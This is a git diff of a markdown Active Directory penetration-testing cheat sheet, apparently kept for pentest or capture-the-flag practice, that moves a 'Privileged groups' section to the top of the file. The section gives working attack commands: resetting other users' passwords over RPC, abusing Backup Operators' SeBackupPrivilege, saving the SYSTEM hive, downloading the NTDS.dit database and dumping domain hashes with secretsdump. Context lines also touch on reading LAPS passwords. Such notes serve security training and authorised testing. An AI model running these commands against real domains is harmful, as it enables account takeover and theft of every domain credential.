@@ -1,3 +1,52 @@
+# Privileged groups
+## AD Recycle Bin
+A user in the group is allowed to read / recover deleted AD objects.
+```powershell
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
+## AD support accounts
+Often we have the credentials of limited administrative accounts such as `IT`, `helpdesk` or `support`. Sometimes, These accounts have an ability to reset the passwords.     
+*Note that the wording of the account name might be different, but related to aforementioned privileges*
+
+### RPC password reset
+[https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)
+
+```bash
+setuserinfo2 <user> 23 <password>
+```
+
+## AD Backup Operators
+Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files
+
+```powershell
+# Import libraries
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+# Enable SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+### Get hashes from .dit file
+```bash
+# REMOTE
+
+## Download .dit file (assuming evil-winrm is used)
+download <database_file>
+
+## Get system HIVE
+reg.exe save hklm\system <destination>
+
+# LOCAL (after file downloads)
+secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
+```
+
+### Scripts needed
+- [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
+
+
 # BloodHound
 This is used to visualise AD environments and discover attack paths.
 
@@ -71,55 +120,6 @@ crackmapexec smb <ip> -u <user> -p <password> --laps
 - [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
 - [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)s
 
-
-
-# Privileged groups
-## AD Recycle Bin
-A user in the group is allowed to read / recover deleted AD objects.
-```powershell
-Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
-```
-
-## AD support accounts
-Often we have the credentials of limited administrative accounts such as `IT`, `helpdesk` or `support`. Sometimes, These accounts have an ability to reset the passwords.     
-*Note that the wording of the account name might be different, but related to aforementioned privileges*
-
-### RPC password reset
-[https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)
-
-```bash
-setuserinfo2 <user> 23 <password>
-```
-
-## AD Backup Operators
-Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files
-
-```powershell
-# Import libraries
-Import-Module .\SeBackupPrivilegeUtils.dll
-Import-Module .\SeBackupPrivilegeCmdLets.dll
-
-# Enable SeBackupPrivilege
-Set-SeBackupPrivilege
-Get-SeBackupPrivilege
-```
-
-### Get hashes from .dit file
-```bash
-# REMOTE
-
-## Download .dit file (assuming evil-winrm is used)
-download <database_file>
-
-## Get system HIVE
-reg.exe save hklm\system <destination>
-
-# LOCAL (after file downloads)
-secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
-```
-
-### Scripts needed
-- [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
 
 # GMSA and ReadGMSAPassword
 Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it.
